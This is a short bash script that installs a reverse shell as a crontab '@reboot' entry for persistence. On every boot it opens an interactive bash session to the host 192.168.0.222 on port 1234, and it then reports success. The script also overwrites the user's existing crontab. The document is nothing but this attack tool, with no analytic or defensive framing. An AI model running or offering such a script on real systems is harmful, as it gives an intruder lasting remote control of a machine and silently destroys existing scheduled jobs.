#!/bin/bash
# Add a reverse shell to crontab for persistence
echo "@reboot /bin/bash -i >& /dev/tcp/192.168.0.222/1234 0>&1" | crontab -
echo "Reverse shell added to crontab successfully."
